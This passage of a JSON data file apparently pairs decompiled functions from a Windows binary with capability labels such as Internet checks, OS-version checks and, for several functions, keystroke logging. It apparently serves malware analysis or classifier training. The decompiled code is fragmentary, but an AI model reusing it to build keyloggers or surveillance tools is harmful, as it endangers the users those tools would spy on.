uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x15;\n    *param_2 = uVar3 | 0x30;\n    param_2[(uVar2 | uVar3) != 0] = (uVar4 * 5 & 0x1fffff) * 5 >> 0x14 | 0x30;\n    return param_2 + ((uVar2 | uVar3) != 0) + 1;\n}\n",
        "token_count": 861
    },
    "00404a2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404a2c(void)\n\n{\n    if (1 < *0x492028) {\n        (**0x496014)(0xeedfadf, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00404a84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a84(void)\n\n{\n    uint in_EAX;\n    int32_t unaff_EBX;\n    uint uVar1;\n    uint auStack8 [2];\n    \n    if (1 < *0x492028) {\n        auStack8[0] = *(unaff_EBX + 4);\n        uVar1 = 0;\n        (**0x496014)(0xeedfae0, 0, 1, auStack8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 118
    },
    "00404a98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a98(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    if (1 < *0x492028) {\n        uVar1 = 0;\n        (**0x496014)(0xeedfae0, 0, 1, &stack0xfffffff8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 87
    },
    "00404acc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404acc(uint param_1, uint param_2)\n\n{\n    uint uStack16;\n    uint uStack8;\n    \n    if (1 < *0x492028) {\n        uStack16 = 0x404add;\n        uStack8 = param_2;\n        fcn.00404aac();\n        (**0x496014)(0xeedfae1, 0, 1, &stack0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00404af4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404af4(uint param_1, uint param_2)\n\n{\n    uint uStack4;\n    \n    if (1 < *0x492028) {\n        uStack4 = param_2;\n        (**0x496014)(0xeedfae2, 0, 1, &uStack4);\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00404b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404b10(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = param_2;\n    uStack4 = in_EAX;\n    if (1 < *0x492028) {\n        (**0x496014)(0xeedfae3, 0, 2, &uStack8);\n    }\n    return CONCAT44(uStack8, uStack4);\n}\n",
        "token_count": 111
    },
    "00405c6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405c6c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_2) {\n        iVar1 = *in_EAX;\n        if ((iVar1 != 0) && (*(iVar1 + -8) == 1)) {\n            fcn.00402f34();\n            *in_EAX = iVar1;\n            *(iVar1 + -4) = param_2;\n            *(param_2 + iVar1) = 0;\n            return;\n        }\n        iVar1 = fcn.004055f4();\n        if (*in_EAX != 0) {\n            fcn.004030fc();\n        }\n    }\n    fcn.00405530();\n    *in_EAX = iVar1;\n    return;\n}\n",
        "token_count": 195
    },
    "00405f58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f58(uint arg_8h)\n\n{\n    fcn.00405ec8();\n    fcn.00405e18();\n    return;\n}\n",
        "token_count": 40
    },
    "00407978": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407978(uint lpMutexAttributes, int32_t arg_ch, uint bInitialOwner)\n\n{\n    sub.kernel32.dll_CreateMutexA(lpMutexAttributes, arg_ch != 0, bInitialOwner);\n    return;\n}\n",
        "token_count": 53
    },
    "00408718": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00408718(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.wsock32.dll___WSAFDIsSet();\n    return iVar1 != 0;\n}\n",
        "token_count": 44
    },
    "0040a854": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0040a854(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 64
    },
    "0040ab20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ab20(uint32_t param_1)\n\n{\n    char cVar1;\n    uchar auStack53 [33];\n    uchar *puStack20;\n    uchar uStack16;\n    \n    puStack20 = auStack53 + 1;\n    if (0x1f < param_1) {\n        param_1 = 0x1f;\n    }\n    cVar1 = fcn.0040e530();\n    if (cVar1 == '\\x01') {\n        param_1 = param_1 - 1;\n    }\n    fcn.0040a8b4();\n    auStack53[param_1 + 1] = 0;\n    uStack16 = 6;\n    fcn.00409774();\n    return;\n}\n",
        "token_count": 170
    },
    "0040b9a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuchar __cdecl fcn.0040b9a0(double *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t in_CX;\n    int32_t iVar4;\n    uint16_t in_DX;\n    int32_t iVar5;\n    uint var_8h;\n    uchar var_3h;\n    uint var_2h;\n    \n    var_3h = 0;\n    uVar2 = fcn.0040b964();\n    iVar5 = (uVar2 & 0x7f) * 0x18;\n    if ((((in_AX != 0) && (in_AX < 10000)) && (in_DX != 0)) &&\n       (((in_DX < 0xd && (in_CX != 0)) && (puVar1 = iVar5 + 0x4927f6 + in_DX * 2,  in_CX < *puVar1 || in_CX == *puVar1))\n       )) {\n        iVar3 = in_DX - 1;\n        if (0 < iVar3) {\n            iVar4 = 1;\n            do {\n                in_CX = in_CX + *(iVar5 + 0x4927f6 + iVar4 * 2);\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = in_AX - 1;\n        iVar5 = iVar3;\n        if (iVar3 < 0) {\n            iVar5 = in_AX + 2;\n        }\n        *arg_8h = ((iVar3 * 0x16d + (iVar5 >> 2)) - iVar3 / 100) + iVar3 / 400 + in_CX + -0xa955a;\n        var_3h = 1;\n    }\n    return var_3h;\n}\n",
        "token_count": 445
    },
    "0040e31c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e31c(void)\n\n{\n    int32_t iVar1;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    \n    uStack148 = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(&uStack148);\n    if (iVar1 != 0) {\n        *0x4927e0 = iStack136;\n        *0x4927e4 = uStack148;\n        *0x4927e8 = uStack144;\n        if (iStack136 == 1) {\n            *0x4927ec = uStack140 & 0xffff;\n        }\n        else {\n            *0x4927ec = uStack140;\n        }\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004102d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004102d4(uint arg_8h, int32_t arg_ch, uint noname_2, int16_t *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.004102d4::var_1h + 1;\n    uStack24 = 0x410341;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040a08c();\n        *arg_14h = -(var_1h != '\\0');\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x410348;\n    uStack24 = 0x410340;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 254
    },
    "00410438": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410438(uint arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uStack20 = 0x41049c;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.0040a128();\n        fcn.00405ea8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4104a3;\n    uStack20 = 0x41049b;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 218
    },
    "00413014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413014(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x4130c6;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.0041516c();\n    uVar3 = var_4h;\n    iVar2 = (***0x495a64)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040a08c();\n        if (cVar1 == '\\0') {\n            fcn.004112a0();\n        }\n    }\n    else if (iVar2 == 0) {\n        var_8h = var_8h & 0xffffff | 1 - (var_8h == 0) << 0x18;\n    }\n    else {\n        fcn.004112a0();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x4130cd);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 360
    },
    "004130d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004130d8(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x495be4)(&puStack24);\n    fcn.004112a0();\n    return 1;\n}\n",
        "token_count": 77
    },
    "0041317c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.0041317c(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint uStack28;\n    \n    uVar1 = fcn.00416180();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(uStack28 + 0x1c))(0xb);\n        *param_2 = '\\x01' - (uStack28 == 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 139
    },
    "00415a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415a80(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.004115c8();\n    }\n    *in_EAX = 0xb;\n    in_EAX[4] = -(param_2 != '\\0');\n    return;\n}\n",
        "token_count": 91
    },
    "00419b9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419b9c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x419bae;\n    fcn.00419c24();\n    uStack20 = 0x419c18;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0x20) != '\\x01') {\n        puStack16 = &stack0xfffffffc;\n        iVar1 = fcn.00419910();\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x20) == '\\x02') {\n                fcn.00419840();\n            }\n            goto code_r0x00419c02;\n        }\n    }\n    fcn.0041975c();\ncode_r0x00419c02:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x419c1f;\n    uStack20 = 0x419c17;\n    fcn.00419c88();\n    return;\n}\n",
        "token_count": 288
    },
    "0041fbec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fbec(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_SetThreadPriority(*(in_EAX + 4), *((param_2 & 0xff) * 4 + 0x492b30));\n    fcn.0041fbac();\n    return;\n}\n",
        "token_count": 82
    },
    "0041fecc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * fcn.0041fecc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar auStack32 [24];\n    \n    uStack44 = *(in_EAX + 4);\n    puStack52 = 0x41fedf;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 == **0x495d24) {\n        iVar1 = 0;\n        uStack40 = *0x49a9b8;\n        do {\n            if (iVar1 == 2) {\n                sub.user32.dll_PeekMessageA(&stack0xffffffd4, 0, 0, 0, 0);\n            }\n            uStack40 = 0x40;\n            uStack44 = 1000;\n            uStack48 = 0;\n            puStack52 = &stack0xffffffe0;\n            uStack56 = 2;\n            iVar1 = sub.user32.dll_MsgWaitForMultipleObjects();\n            fcn.0041fbac();\n            if (iVar1 == 1) {\n                fcn.0041f760();\n            }\n        } while (iVar1 != 0);\n    }\n    else {\n        puStack52 = 0xffffffff;\n        uStack56 = uStack44;\n        sub.kernel32.dll_WaitForSingleObject();\n    }\n    puVar2 = puStack52;\n    sub.kernel32.dll_GetExitCodeThread(puStack52, &stack0xffffffc8);\n    fcn.0041fbac();\n    return puVar2;\n}\n",
        "token_count": 376
    },
    "004202a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004202a0(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((param_1 == '\\x01') && (param_2 != 0)) {\n        fcn.00420284();\n    }\n    if (*(in_EAX + 0x10) != 0) {\n        iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n        while (-1 < iVar2) {\n            piVar1 = fcn.004198b4();\n            (**(*piVar1 + 0x10))();\n            iVar2 = iVar2 + -1;\n            if (*(*(in_EAX + 0x10) + 8) <= iVar2) {\n                iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "00421648": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00421648(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (in_EAX == 1) {\n        return 1;\n    }\n    if (in_EAX == 2) {\n        uVar1 = 2;\n    }\n    else if (in_EAX == 4) {\n        uVar1 = 3;\n    }\n    else if (in_EAX == 3) {\n        uVar1 = 4;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "00422014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.00422014(void)\n\n{\n    int32_t arg_ch;\n    uchar *arg_8h;\n    uchar auStack20 [4];\n    \n    arg_8h = auStack20;\n    arg_ch = fcn.00421f64();\n    if (arg_ch < 1) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.0042219c(arg_8h, arg_ch);\n        if ((arg_8h == '\\x01') || (arg_8h == '\\x02')) {\n            fcn.004059dc();\n            fcn.0040a870();\n            fcn.00405c6c();\n        }\n        else {\n            fcn.004215d8();\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00424414": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424414(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iStack108;\n    int32_t iStack104;\n    char cStack100;\n    char cStack99;\n    char cStack98;\n    uchar uStack97;\n    uint8_t uStack93;\n    \n    piVar2 = 0x492b88;\n    piVar3 = param_2;\n    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    if (in_EAX != 0) {\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            param_2[1] = in_EAX;\n            if (699 < iStack104) {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 1;\n            }\n            if (cStack100 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 2;\n            }\n            if (cStack99 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 4;\n            }\n            if (cStack98 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 8;\n            }\n            *(param_2 + 0xe) = uStack97;\n            fcn.00404100();\n            fcn.004039ac();\n            if ((uStack93 & 0xf) == 1) {\n                *(param_2 + 3) = 2;\n            }\n            else if ((uStack93 & 0xf) == 2) {\n                *(param_2 + 3) = 1;\n            }\n            else {\n                *(param_2 + 3) = 0;\n            }\n            *param_2 = in_EAX;\n            param_2[2] = iStack108;\n        }\n    }\n    return;\n}\n",
        "token_count": 528
    },
    "00424f64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00424f64(void)\n\n{\n    fcn.00424ecc();\n    fcn.00424ee8();\n    return;\n}\n",
        "token_count": 33
    },
    "00425080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00425080(void)\n\n{\n    fcn.00424ecc();\n    fcn.00424ee8();\n    return;\n}\n",
        "token_count": 32
    },
    "0042808c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042808c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack112;\n    int32_t iStack72;\n    \n    iVar1 = (***param_2)();\n    iVar2 = fcn.0041b730();\n    if (100 < iVar1 - iVar2) {\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0x14))();\n        if ((iStack112 == 1) && (iStack72 == 0x464d4520)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 155
    },
    "004280ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004280ec(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.00427b60();\n    }\n    else if (1 < *(*(in_EAX + 0x28) + 4)) {\n        iVar2 = fcn.00404620();\n        iVar1 = *(*(in_EAX + 0x28) + 8);\n        if (iVar1 != 0) {\n            uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar1, 0);\n            *(iVar2 + 8) = uVar3;\n        }\n        *(iVar2 + 0x10) = *(*(in_EAX + 0x28) + 0x10);\n        *(iVar2 + 0xc) = *(*(in_EAX + 0x28) + 0xc);\n        *(iVar2 + 0x18) = *(*(in_EAX + 0x28) + 0x18);\n        *(iVar2 + 0x1c) = *(*(in_EAX + 0x28) + 0x1c);\n        *(iVar2 + 0x20) = *(*(in_EAX + 0x28) + 0x20);\n        fcn.004288e4();\n        *(in_EAX + 0x28) = iVar2;\n        fcn.004288e0();\n    }\n    return;\n}\n",
        "token_count": 346
    },
    "00429a18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00429a18(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 0x28) == 1) && (*(iVar1 + 0x2a) == 1)) {\n        return CONCAT31(iVar1 + 0x18 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 101
    },
    "0042a570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a570(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint lpvObject;\n    int32_t var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 8)) {\n        puStack108 = 0x42a590;\n        fcn.00429bf8();\n        puStack108 = 0x42a59f;\n        fcn.00403af4();\n        if (param_2 != 0) {\n            puStack108 = &fcn.0042a570::lpvObject;\n            uStack112 = 0x54;\n            puStack120 = 0x42a5af;\n            iStack116 = param_2;\n            sub.gdi32.dll_GetObjectA();\n        }\n        if (*(iVar1 + 4) == 1) {\n            var_4h = *(iVar1 + 0x10);\n            *(iVar1 + 0x10) = 0;\n        }\n        else if (*(iVar1 + 0x10) == *0x49a9fc) {\n            var_4h = *0x49a9fc;\n        }\n        else {\n            puStack120 = 0x42a5dc;\n            var_4h = fcn.00429118();\n        }\n        uStack124 = 0x42a60b;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        uVar2 = 0;\n        puStack120 = &stack0xfffffffc;\n        fcn.00429e68(0, 0, &fcn.0042a570::lpvObject);\n        *in_FS_OFFSET = uVar2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "0042a78c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a78c(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack96 [4];\n    uint16_t uStack80;\n    uint16_t uStack78;\n    uint uStack72;\n    uint16_t uStack60;\n    uint16_t uStack58;\n    \n    iVar1 = in_EAX[10];\n    if ((*(iVar1 + 0x3c) == 1) && (*(iVar1 + 0x3e) == 1)) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (param_2 != uVar2) {\n        fcn.00429c08();\n        puVar4 = iVar1 + 0x18;\n        puVar5 = auStack96;\n        for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack72 = 0;\n        uStack60 = param_2;\n        uStack80 = param_2;\n        uStack78 = uStack80;\n        uStack58 = uStack60;\n        fcn.00429528(auStack96);\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "0042a808": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
